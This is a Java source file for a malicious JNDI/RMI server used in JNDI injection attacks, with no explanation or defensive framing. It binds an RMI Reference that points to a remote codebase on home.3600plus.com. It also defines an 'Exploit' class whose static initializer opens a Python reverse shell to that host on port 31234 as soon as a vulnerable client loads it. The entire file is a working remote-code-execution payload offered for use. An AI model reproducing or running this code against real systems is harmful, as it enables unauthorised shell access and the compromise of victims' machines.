

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

class Exploit {
	static String host = "home.3600plus.com";
	static int port = 31234;
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"bash", "-c" , "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + host + "\"," + port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' "};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}

public class JNDIServer {

    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(19000);
        Reference reference =
                new Reference("Exploit", "Exploit","http://home.3600plus.com:31888/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("Exploit",referenceWrapper);
        System.out.println("Server Done2");
    }
}
